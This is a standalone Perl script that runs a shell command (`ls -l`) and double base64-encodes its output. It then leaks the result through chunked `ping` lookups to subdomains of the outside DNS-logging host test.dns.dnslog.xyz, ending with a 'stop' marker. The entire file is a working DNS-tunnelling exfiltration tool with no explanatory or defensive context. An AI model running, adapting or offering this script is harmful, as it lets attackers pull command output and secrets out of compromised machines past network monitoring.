#!/usr/bin/perl
use MIME::Base64;
$domain='test.dns.dnslog.xyz';
$cmd=`ls -l`;
$os='l2';
$b64cmd=encode_base64($cmd);
$b64cmd=~s/[\n\r]*//g;
$b64cmd=encode_base64($b64cmd);
$b64cmd=~s/[\n\r=]*//g;
@b64cmd_list=$b64cmd=~/.{1,63}/g;
@dataSource=('a'..'z','A'..'Z');
$rand_str=join '',map{$dataSource[int rand @dataSource]} 0..5;
$count='0';
foreach $i (@b64cmd_list){
    $b64domain=$rand_str.'.'.$os.'.'.$count.'.'.$i.'.'.$domain;
    $cmd='ping -c 1 '.$b64domain; 
    system($cmd);
    $count+='1';
}
$b64domain=$rand_str.'stop.'.$os.'.'.$count.'.stop.'.$domain;
$cmd='ping -c 1 '.$b64domain;
system($cmd);